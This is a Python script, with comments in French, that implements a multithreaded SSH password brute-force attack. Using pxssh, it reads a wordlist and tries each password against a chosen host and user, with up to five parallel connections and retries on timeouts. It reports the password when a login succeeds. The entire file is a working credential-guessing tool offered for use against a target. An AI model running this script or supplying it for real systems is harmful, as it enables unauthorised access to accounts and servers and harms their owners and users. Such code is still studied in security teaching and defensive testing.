import pxssh  # Importe pxssh pour automatiser les connexions SSH
import time  # Importe time pour utiliser les pauses (sleep)
import optparse  # Importe optparse pour gérer les options en ligne de commande (obsolète, remplacer par argparse)
from threading import *  # Importe tout depuis la bibliothèque threading pour gérer plusieurs threads

# Définit le nombre maximal de connexions simultanées
max_connection = 5

# Crée un sémaphore limité pour gérer les connexions multiples et éviter les dépassements
connction_lock = BoundedSemaphore(value=max_connection)

# Variable pour indiquer si le mot de passe a été trouvé
found = False

# Variable pour compter le nombre de tentatives échouées
fails = 0

# Fonction pour tenter une connexion SSH avec un mot de passe donné
def connect(host, user, password, release):
    global found  # Accède à la variable globale 'found'
    global fails  # Accède à la variable globale 'fails'
    try:
        s = pxssh.pxssh()  # Crée une instance pxssh pour se connecter en SSH
        s.login(host, user, password)  # Tentative de connexion avec les informations fournies
        print(f'Password found : {password}')  # Si la connexion réussit, le mot de passe est correct
        found = True  # Met à jour la variable 'found' pour indiquer que le mot de passe est trouvé
    except Exception as e:  # Gestion des erreurs
        if 'read_nonblocking' in str(e):  # Si une erreur 'read_nonblocking' survient
            fails += 1  # Incrémente le compteur de tentatives échouées
            time.sleep(5)  # Attend 5 secondes avant de réessayer
            connect(host, user, password, False)  # Relance la connexion sans libérer le verrou
        elif 'syncronize with origine prompt' in str(e):  # Si une erreur de synchronisation survient
            time.sleep(1)  # Attend 1 seconde avant de réessayer
            connect(host, user, password, False)  # Relance la connexion sans libérer le verrou
    finally:
        if release:  # Si l'option 'release' est vraie
            connction_lock.release()  # Libère le verrou pour permettre à d'autres threads de se connecter

# Fonction principale pour gérer les options de ligne de commande et lancer les tentatives de connexion
def main():
    # Initialise l'analyseur d'options de ligne de commande
    parser = optparse.OptionParser('usage: %prog -H <target host> -u <target user> -F <password list>')
    parser.add_option('-H', dest='tghost', type='string', help='specify target host')  # Option pour spécifier l'hôte cible
    parser.add_option('-u', dest='user', type='string', help='specify target user')  # Option pour spécifier l'utilisateur cible
    parser.add_option('-F', dest='passwdfile', type='string', help='specify password list')  # Option pour spécifier le fichier de mot de passe
    (options, args) = parser.parse_args()  # Analyse les options fournies en ligne de commande
    host = options.tghost  # Récupère l'hôte cible
    user = options.user  # Récupère l'utilisateur cible
    passwdfile = options.passwdfile  # Récupère le fichier contenant la liste de mots de passe

    # Vérifie si les options nécessaires sont présentes, sinon quitte
    if host is None or user is None or not passwdfile:
        parser.usage  # Affiche l'usage si des options manquent
        exit()

    # Ouvre le fichier contenant la liste de mots de passe
    fn = open(passwdfile, 'r')

    # Lit chaque ligne (mot de passe) du fichier
    for line in fn.readlines():
        if found:  # Si le mot de passe a déjà été trouvé, quitte
            print('exiting : password found')
            exit(0)
        if fails > 5:  # Si plus de 5 échecs sont comptabilisés (timeout), quitte
            print('Exiting : too many socket timeout')
            exit(0)
        
        connction_lock.acquire()  # Acquiert un verrou pour limiter le nombre de connexions simultanées
        password = line.strip('\r').strip('\n')  # Supprime les retours à la ligne des mots de passe
        print(f'testing pass : {password}')  # Affiche le mot de passe en cours de test
        
        # Crée un nouveau thread pour tester la connexion SSH avec le mot de passe courant
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()  # Démarre le thread

# Point d'entrée principal
if __name__== '__main__':
    main()  # Exécute la fonction principale




